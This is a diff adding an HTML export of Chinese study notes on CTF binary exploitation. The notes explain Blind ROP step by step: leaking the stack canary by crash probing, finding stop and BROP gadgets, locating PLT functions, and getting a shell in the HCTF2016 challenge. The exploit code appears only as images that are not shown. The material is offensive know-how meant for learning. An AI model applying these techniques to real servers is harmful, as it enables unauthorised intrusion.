+</h3>
+<h3 class="topic">
+<a name="4rtald1j0goklo12ulckkbiivs">&nbsp;&nbsp;&nbsp;攻击条件</a>
+</h3>
+<h3 class="topic">
+<a name="3n4g0s5n1all02qnfj25qgumd1">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/3qdufusakj18csgo4lr6eiqkcp.png"></p>
+<h3 class="topic">
+<a name="70fomh0v7o8gq7mjaq1tg9v4hg">&nbsp;&nbsp;&nbsp;攻击原理</a>
+</h3>
+<h3 class="topic">
+<a name="30onij28ll1lqdm4iqs7uag6la">&nbsp;&nbsp;&nbsp;&nbsp;基本攻击思路</a>
+</h3>
+<h3 class="topic">
+<a name="55lk4mnr60n9sc6k9a6mfjfkoa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/03rcbvt03sb95o5g17nmhg5hta.png"></p>
+<h3 class="topic">
+<a name="6ncsj5u3lgo4gj7unb19947khh">&nbsp;&nbsp;&nbsp;具体攻过程</a>
+</h3>
+<h3 class="topic">
+<a name="058hasn00jjmk74fdi0kq588kf">&nbsp;&nbsp;&nbsp;&nbsp;判断栈溢出长度</a>
+</h3>
+<h3 class="topic">
+<a name="01s1lll6j6iobbsjddp15j0fsv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/706km8f0acsiueoeb9atb93hgf.png"></p>
+<h3 class="topic">
+<a name="6n0rsggn2iqqva5jq6otjn6qjq">&nbsp;&nbsp;&nbsp;&nbsp;stack reading</a>
+</h3>
+<h3 class="topic">
+<a name="1jkr7a7egs9umotc0gf80mksuk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;核心是通过枚举，根据crash与否，测试出canary ebp 返回地址的值</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4bnf8pjdefut1bs0cvl3fbspvv.png"></p>
+<h3 class="topic">
+<a name="1lej5rol2lfucisf1mgjm3gfue">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;攻击条件约束了程序每一次crash前后canary ebp 返回地址都是一样的，所以可以通过单个字节枚举的方式，查看程序是否crash，从而得到canary，ebp，返回地址的值</a>
+</h3>
+<h3 class="topic">
+<a name="7qqup1ic963n1q5sl98acsund5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里没有完全理解，即如何具体实施呢？</a>
+</h3>
+<h3 class="topic">
+<a name="2vavcjo0reo2t7h9vcgtpni9sn">&nbsp;&nbsp;&nbsp;&nbsp;Blind ROP</a>
+</h3>
+<h3 class="topic">
+<a name="5ulieofocubs7j5ou1671igk65">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关键是如何调用write或puts函数输出栈中泄露的信息或者输出可执行程序的代码段</a>
+</h3>
+<h3 class="topic">
+<a name="0pb9svlt559fdlhgfep1k2nffd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何获得输出函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="21bq78dba08ltlv0fcnklgdc7n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过系统调用（int 0x80、sysenter 、syscall ）构造write函数调用</a>
+</h3>
+<h3 class="topic">
+<a name="02oq8scg22kkjq7he8sajelv2r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;问题在于如果是动态链接的程序，很难在程序中找到现成的int 0x80指令</a>
+</h3>
+<h3 class="topic">
+<a name="2h9hl3vis1on1s0k7no42spofd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6194e3rf86h0v23h7hpk87pctf.png"></p>
+<h3 class="topic">
+<a name="1skt020t8nv90tacvsbtk19k88">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过plt表获得write函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="7eovlgia8eosfqj8ruh88313j2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何构造输出函数参数</a>
+</h3>
+<h3 class="topic">
+<a name="44jr29g28o16qn5geg24nrji5t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write函数需要三个参数分别把保存在寄存器 rdi（输入或输出） rsi（输出数据源地址） rdx（数据输出长度）</a>
+</h3>
+<h3 class="topic">
+<a name="4lc5dtj8q28icaks2mjo9kvpti">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前两个参数的构建</a>
+</h3>
+<h3 class="topic">
+<a name="30if95h2br78d3rut0e5sogi9u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过截断_libc_csu_init中的指令实现</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5oa3i1kc361kmabuphls5pc0vs.png"></p>
+<h3 class="topic">
+<a name="1r3dsuc6hc1nqj8l5q1kkgikob">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx参数的构建</a>
+</h3>
+<h3 class="topic">
+<a name="6aiai3qdtbs43b1hs0h3ls5km4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop rbx; ret指令基本不存在</a>
+</h3>
+<h3 class="topic">
+<a name="1kq8nml256lm8i81q17tj4uk0a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当执行strcmp时，rbx被设置为将要被比较的字符串的长度，可以以此控制rdx（使用该方法的前提是可执行程序中使用了strcmp，即plt表中存在strcmp）</a>
+</h3>
+<h3 class="topic">
+<a name="1kccg4c1mtk60vai4d0on3318c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4tvkivng9ae3r37fe9f0ee26k6.png"></p>
+<h3 class="topic">
+<a name="6jgn47mioodlcj2srqe58od21k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;具体实现可以分为以下几步</a>
+</h3>
+<h3 class="topic">
+<a name="3tvr94gljs61lld10hcttalhd2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;寻找gadget</a>
+</h3>
+<h3 class="topic">
+<a name="3oc47n96ojdj5jb67kpdamtfc7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;寻找stop gadgets</a>
+</h3>
+<h3 class="topic">
+<a name="0eigp3lv9in6rtm5aehdpg48hf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stop gadget即一段代码，程序执行到该代码就会无限循环，攻击者可以保持连接状态，或者gadget不进入无限循环，会执行较长的一段时间，不会立即crash</a>
+</h3>
+<h3 class="topic">
+<a name="37t8bf1rnnhhj6j5lff8v6hu66">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果将一条指令的地址覆盖到返回地址处，然后将stop gadget的地址覆盖到返回地址之后，如果函数溢出后并没有立即crsh，说明此时返回地址对应的指令是一条gadget，程序执行该gadget之后，返回继续执行stop gadget，所以没有立即crash，反之如果程序立即crash，说明此时返回地址对应的指令不是gadget</a>
+</h3>
+<h3 class="topic">
+<a name="1vtpbfs4crihue2r6glcuruc3b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即stop gadget最大的作用就是判断指定地址处的指令序列是否能作为一个gadget</a>
+</h3>
+<h3 class="topic">
+<a name="6pbh0ti8e9m6548loceeba47qj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/1ii0t1a416t59tnb7jija5lsae.png"></p>
+<h3 class="topic">
+<a name="3qosn2gsqu2cttb7bvq3leets5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;识别gadgets</a>
+</h3>
+<h3 class="topic">
+<a name="5v0bu0k73b8et14m4i55s2eg8p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过对栈进行特定的布局和该布局下的程序行为判断gadget的类型</a>
+</h3>
+<h3 class="topic">
+<a name="7bcnoqg27br8fjq9ck9569nsk6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;引入栈中的三种地址</a>
+</h3>
+<h3 class="topic">
+<a name="7garmvkutndsci1ljrlsl99f3i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该三种地址在栈中进行不同的布局，可以用于检测不用类型的gadget</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/21pe15sq8m6h8j43t2fr8c93jv.png"></p>
+<h3 class="topic">
+<a name="43f0gn661fomonail4j4po3l1s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能的栈布局类型</a>
+</h3>
+<h3 class="topic">
+<a name="44rj1rs0l5b767t8klgk7is7q7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/3ba1gvpvrsgi4dbeg8pufa929p.png"></p>
+<h3 class="topic">
+<a name="1hje8hv8tgbp0nsmavcuj8s1up">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要注意的是</a>
+</h3>
+<h3 class="topic">
+<a name="2gmup5rp0j5jqdf1c1iasvsvok">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5pnus7803hmova8g77fischglc.png"></p>
+<h3 class="topic">
+<a name="0a73dqr7fusfcmgaftnic5sn7q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;寻找PLT表中write、strcmp函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="004j9eqccknievd94tn9k3ah5t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;寻找plt表</a>
+</h3>
+<h3 class="topic">
+<a name="19ka46h8q0ccokcmetu29fd7en">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6uvl8hkch7o1soo4g30dg031jp.png"></p>
+<h3 class="topic">
+<a name="3gdg4gh5m6u3n8cpbgpb100pkc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时因为我们没有被破解程序的原代码或二进制文件，所以确定plt表的过程远没有使用 pwntools中ELF模块那么轻松，需要根据PLT表每个表项16字节并且不容易导致程序崩溃的特点寻找plt表</a>
+</h3>
+<h3 class="topic">
+<a name="51t59vip0eafkhb8u1h579jlgg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设计write函数的参数传递方式</a>
+</h3>
+<h3 class="topic">
+<a name="2msuv1fdn6c42gvse0qq3n7nuu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关键是控制rdx，这里选择通过执行时strcmp函数,从而将rbx的数值修改为被比较字符串的长度（strncmp或者strcasecmp函数也具有相同的效果）</a>
+</h3>
+<h3 class="topic">
+<a name="49ojms22ges0jl771h59giddsd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过之前寻找gadget的过程，我们已经找到了函数_libc_csu_init对应的gadget，所以可以控制传给strcmp函数的参数_，执行strcmp的过程中，只有保证两个函数参数均为可读的内存地址，此时，函数才能正常执行</a>
+</h3>
+<h3 class="topic">
+<a name="447upksqjh7361ru1l8s2cce5q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcmp函数参数传递的问题解决了，现在问题是如何在plt中确定strcmp函数的位置，还是因此时没有被破解程序的源代码或二进制文件，所以无法使用pwntools中ELF模块的方式（elf.plt['strcmp']）获得函数地址，此时有两种解决方法</a>
+</h3>
+<h3 class="topic">
+<a name="2bas9k1jb2p7dpknj3an81knfq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有一种比较直接的方法就是从头到尾依次扫描每个plt表项（比较麻烦）</a>
+</h3>
+<h3 class="topic">
+<a name="2pa3ug9fah8asbs9lttmgs8oak">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用plt表项的慢路径&#13;
+并且利用下一个表项的慢路径的地址来覆盖返回地址</a>
+</h3>
+<h3 class="topic">
+<a name="4fq1a5iefai6llb8o8sl9ssa2q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plt表项的慢路径究竟是什么？？？？？？？&#13;
+</a>
+</h3>
+<h3 class="topic">
+<a name="3i1s1aofmrq9h842unm6k2l8sr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;寻找write或puts等输出函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="7p26qr76fn7hp22k9gr4kgqi2k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/05npu45boe01v33vht8k7mhl66.png"></p>
+<h3 class="topic">
+<a name="45l5dhtqssc28qcvnej6rf5e5s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即可以通过遍历plt表调用每一个函数，然后将参数设置为write函数所需形式，直到程序输出对应内容，说明此时找到writf函在plt表中的位置</a>
+</h3>
+<h3 class="topic">
+<a name="6c7f1g7hmn7g90hls9bv7ti1ck">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于找到文件描述符的值没有看懂&#13;
+什么是文件描述符？&#13;
+为何可以通过ropchain找到文件描述符？&#13;
+为何打开多个连接可以找到文件描述符</a>
+</h3>
+<h3 class="topic">
+<a name="1r3h92ur48gui4a5500mkd9m56">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/zzyczzyc/article/details/82938950</a>
+</h3>
+<h3 class="topic">
+<a name="1vb1ve37jcoemc4p6eainskg27">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.cnblogs.com/alan666/p/8311890.html</a>
+</h3>
+<h3 class="topic">
+<a name="2crkds7e6uk3pqndpiehumi715">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/33d9gdh5nu2uk7cc978bj9c7rt.png"></p>
+<h3 class="topic">
+<a name="6jt6vt8tt3ou3icg3ooq5sbb0l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与write类似，通过遍历plt表，输出elf文件头中的魔数，从而判断当前是否遍历到puts函数</a>
+</h3>
+<h3 class="topic">
+<a name="1nsq9gsa1igclmmj8dgrrd19b9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部</a>
+</h3>
+<h3 class="topic">
+<a name="193gbj195cnbj2efene4mtn90i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输出函数构造完成，泄露更多内存数据进行进一步攻击</a>
+</h3>
+<h3 class="topic">
+<a name="7naaigbede9f9k2lvnq3n564mp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4mhh9spqggaf8bkukav8ub1ved.png"></p>
+<h3 class="topic">
+<a name="6mo338r5qlncqfrrcb4sd9ciql">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="6nivf42mq4c81nko54d2b81d4m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;题目：HCTF2016的出题人失踪了</a>
+</h3>
+<h3 class="topic">
+<a name="5rqsm5td2nea3nbsferc420esa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;具体题目可以去ctfwiki对应github上下载</a>
+</h3>
+<h3 class="topic">
+<a name="4sf64jbqf06bt1kk072mdvksf1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html</a>
+</h3>
+<h3 class="topic">
+<a name="60j6f4ka06bjldai2h2c612n2e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;确定溢出长度</a>
+</h3>
+<h3 class="topic">
+<a name="0bmt32trnu56ne0ksrg2p8mb03">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5kul513api7nrhpua2faur7pf7.png"></p>
+<h3 class="topic">
+<a name="1rb6r2v98t1d82a78r4b1bo5ss">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;寻找stop gadget</a>
+</h3>
+<h3 class="topic">
+<a name="4q5773a710fqka12u17tr24130">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5qus7b7bkrk18dckgih2spssn9.png"></p>
+<h3 class="topic">
+<a name="18um853v022ajodh1smjbfnk5h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/08icmnv3lvp85vcbv7gk4ke1tl.png"></p>
+<h3 class="topic">
+<a name="29jjllpsohjoo4na8bit0ifvn6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;识别检验brop gadgets</a>
+</h3>
+<h3 class="topic">
+<a name="0q7vb6ub2g6vj1ksg9cgj5orf1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4rn6rbeih68bk3tlob69eaip60.png"></p>
+<h3 class="topic">
+<a name="6njlnn6llt8eqen5t06g4r4od2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;确定puts@plt地址</a>
+</h3>
+<h3 class="topic">
+<a name="7is0pi6s7ckg706aj5s2a8hqas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4u571uaemopf7agrqjfuofdh28.png"></p>
+<h3 class="topic">
+<a name="6j25s74tl44n813clbgacc2qjd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;确定puts@got地址</a>
+</h3>
+<h3 class="topic">
+<a name="5v9u6fbr8rst8a3t82e2dms4pa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里疑惑的点在于将输出数据截取开始到"/nWelCome",如何保证plt表项一定在该字符串之前被输出出来？与内存结构有什么关系？&#13;
+&#13;
+第二个问题是continue的使用会不会造成addr+=len(addr)不被执行</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/7qv70n34jiam93buuplvdkn9n8.png"></p>
+<h3 class="topic">
+<a name="7tbbgf3ps5qqbrr0kiil8s2psj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6k0tj6h81v39m0r8ut4s9isjeu.png"></p>
+<h3 class="topic">
+<a name="0i5qsj71fukh2faign0vctamn8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为plt表项中存在jmp puts@got的指令，所以通过打印puts函数的plt表项内容，可以获得puts的got表项的地址</a>
+</h3>
+<h3 class="topic">
+<a name="069kta97193kv8sftg56uq5d7s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序利用</a>
+</h3>
+<h3 class="topic">
+<a name="1bpomdf1ih7imtcao9et0rukg6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本质还是使用LibcSearcher获得libc中的system函数地址和'/bin/sh',最终获得shell</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/7462mb0ac4copnv59mqib4plso.png"></p>
+<h3 class="topic">
+<a name="7ehkvictgcknivd7k9j4j1707c">&nbsp;&nbsp;参考阅读</a>
+</h3>
+<h3 class="topic">
+<a name="725a2qm79mlbaq8lvsorkrv91u">&nbsp;&nbsp;&nbsp;&#13;
+http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/&#13;
+http://bobao.360.cn/learning/detail/3694.html&#13;
+http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/</a>
+</h3>
+<h3 class="topic">
+<a name="2j92k49ld07mftr0us90abd3k8">&nbsp;高级rop</a>
+</h3>
+<h3 class="topic">
+<a name="22k3kl1lbt1h82rnmshu3pklmp">&nbsp;&nbsp;与一般的rop相比，只是利用了更加底层的原理</a>
+</h3>
+<h3 class="topic">
+<a name="5ap8khuk6697kddfqvknueepap">&nbsp;&nbsp;ret2_dl_runtime_resolve</a>
+</h3>
+<h3 class="topic">
+<a name="1l8b01a1lf4qn8lh37evjt8dk1">&nbsp;&nbsp;SROP</a>
+</h3>
+<h3 class="topic">
+<a name="69deauvpce32cv18he2e3tgoig">&nbsp;&nbsp;ret2VDSO</a>
+</h3>
+<h2 class="topic">
+<a name="5km370gs0l5tqet1nid639c27a">linux环境变量</a>
+</h2>
+<h3 class="topic">
+<a name="3gicd6vrrbthhhu5lm9ib8hbh2">&nbsp;http://c.biancheng.net/view/5970.html</a>
+</h3>
+<h3 class="topic">
+<a name="21akq36iehv8nseq9ilqd37q74">&nbsp;env命令可以用于查看环境变量</a>
+</h3>
+<h2 class="topic">
+<a name="3rksbomr3obgmo9vcq9nf92i1m">linux系统调用的方法</a>
+</h2>
+<h3 class="topic">
+<a name="545uoo013n477futv6i7ohvpsa">&nbsp;int 0x80</a>
+</h3>
+<h3 class="topic">
+<a name="6ueiiao4rgq21noqa9ha25nabm">&nbsp;&nbsp;最传统的系统调用方式，速度较慢，下面两种都是快速系统调用方式</a>
+</h3>
+<h3 class="topic">
+<a name="337sgqvkj6i8vg4pabn2adp1rm">&nbsp;sysenter</a>
+</h3>
+<h3 class="topic">
+<a name="1gsra3cvpkoubquduh24bjavtc">&nbsp;&nbsp;intel32位架构中使用</a>
+</h3>
+<h3 class="topic">
+<a name="2fr2td0r87rl5gqdpgraihvm6f">&nbsp;syscall</a>
+</h3>
+<h3 class="topic">
+<a name="0pkidrgf1inlt1nq3smjgurdr0">&nbsp;&nbsp;intel64位架构、AMD32位架构、AMD64位架构使用</a>
+</h3>
+<h3 class="topic">
+<a name="0d4s5khblcnrb20tb7scai11t0">&nbsp;其中int 0x80的原理被运用于ret2syscall的漏洞利用方式中，即在内存中寻找int 0x80指令的地址，然后通过搜搜gadget构造int 0x80的参数传递</a>
+</h3>
+<h3 class="topic">
+<a name="2leh6brc9jmkb11svli6lj8c8u">&nbsp;https://cloud.tencent.com/developer/article/1492374</a>
+</h3>
+</body>
+</html>
